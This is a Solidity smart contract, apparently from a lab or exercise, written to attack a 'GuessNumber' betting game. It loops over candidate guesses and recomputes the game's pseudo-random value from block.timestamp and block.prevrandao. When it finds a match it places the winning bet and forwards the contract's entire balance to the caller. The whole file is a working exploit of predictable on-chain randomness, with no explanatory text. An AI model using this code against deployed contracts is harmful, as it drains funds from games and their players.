pragma solidity ^0.8.0;
import {GuessNumber} from "./GuessNumber.sol";

contract GuessNumberAttack {

    GuessNumber guessNumber;

    constructor(GuessNumber _guessNumber) payable {
        guessNumber = _guessNumber;
    }

    function guessNumberAttack() external payable {
        require(msg.value >= 0.01 ether, "not enough bet");

        for (uint i=0; i<501; i++){
            if (1 == uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao, i))) % 500){
                guessNumber.guessNumber{value: msg.value}(i);
                (bool success,) = msg.sender.call{value: address(this).balance}("");
                if (!success) revert();
                return;
            }
        }
    }

    receive() external payable {}

}